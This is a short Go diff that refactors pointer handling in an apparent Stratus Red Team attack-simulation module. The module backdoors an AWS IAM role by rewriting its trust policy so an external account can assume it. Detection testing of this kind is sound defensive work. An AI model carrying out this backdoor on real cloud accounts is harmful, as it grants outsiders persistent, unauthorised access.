@@ -4,7 +4,6 @@ import (
 	"context"
 	_ "embed"
 	"errors"
-	"github.com/aws/aws-sdk-go-v2/aws"
 	"github.com/aws/aws-sdk-go-v2/service/iam"
 	"github.com/datadog/stratus-red-team/internal/providers"
 	"github.com/datadog/stratus-red-team/pkg/stratus"
@@ -53,8 +52,8 @@ func detonate(params map[string]string) error {
 
 	log.Println("Backdooring IAM role " + roleName + " by allowing sts:AssumeRole from an external AWS account")
 	_, err := iamClient.UpdateAssumeRolePolicy(context.Background(), &iam.UpdateAssumeRolePolicyInput{
-		RoleName:       aws.String(roleName),
-		PolicyDocument: aws.String(maliciousIamPolicy),
+		RoleName:       &roleName,
+		PolicyDocument: &maliciousIamPolicy,
 	})
 
 	if err != nil {
